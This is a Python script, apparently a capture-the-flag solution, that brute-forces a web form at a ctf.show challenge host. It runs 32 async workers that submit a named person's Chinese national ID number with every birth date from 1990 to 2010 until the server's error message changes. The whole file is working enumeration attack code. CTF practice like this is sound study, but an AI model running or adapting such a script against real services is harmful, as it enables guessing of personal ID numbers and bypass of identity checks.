import asyncio
from json import loads
from datetime import date, timedelta
import aiohttp

url = 'https://55144cbc-ce00-4145-919f-292653a519e4.challenge.ctf.show/info/checkdb.php'
NUM = 32

def run_tasks(L):
    U = []
    for i in L:
        U.append(asyncio.ensure_future(i))
    loop = asyncio.get_event_loop()
    loop.run_until_complete(asyncio.wait(U))

class TaskRuner:
    def __init__(self, n) -> None:
        self.L = []
        for i in range(n):
            self.L.append(self.task_function(i))
        self.task_num = n

    async def task_function(self, n):
        pass

    def run(self):
        run_tasks(self.L)
        self.on_over()

    def on_over(self):
        pass

class NYR:
    def __init__(self, start_date, end_date) -> None:
        self.start_date = start_date
        self.end_date = end_date
        self.delta = timedelta(days=1)
        self.current_date = start_date

    def next(self):
        t = self.current_date
        if t > self.end_date:
            return None
        self.current_date += self.delta
        return t

class Scanner(TaskRuner):
    def __init__(self, d1, d2, n) -> None:
        super().__init__(n)
        self.nyr = NYR(d1, d2)
        self.alive = True

    async def task_function(self, n):
        while self.alive:
            u = self.nyr.next()
            if not u:
                break
            r = await self.login(u)
            if r:
                print(f"Found valid ID: {r}")
                self.alive = False

    async def login(self, t: date):
        n = t.year
        y = t.month
        r = t.day
        n_str = str(n)
        y_str = str(y).zfill(2)
        r_str = str(r).zfill(2)
        sfz = f'621022{n_str}{y_str}{r_str}5237'
        data = {
            'a': '高先伊',
            'p': sfz,
        }
        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.post(url=url, data=data, ssl=False) as response:
                    text = await response.text()
                    js = loads(text)
                    msg = js.get('msg', '')
                    print(f"Trying {sfz}: {msg}")
                    return msg != '提交信息有误'
        except Exception as e:
            print(f"Error occurred: {e}")
            return False

    def on_over(self):
        print("Scan completed.")

if __name__ == "__main__":
    a = Scanner(date(1990, 1, 1), date(2010, 12, 31), NUM)
    a.run()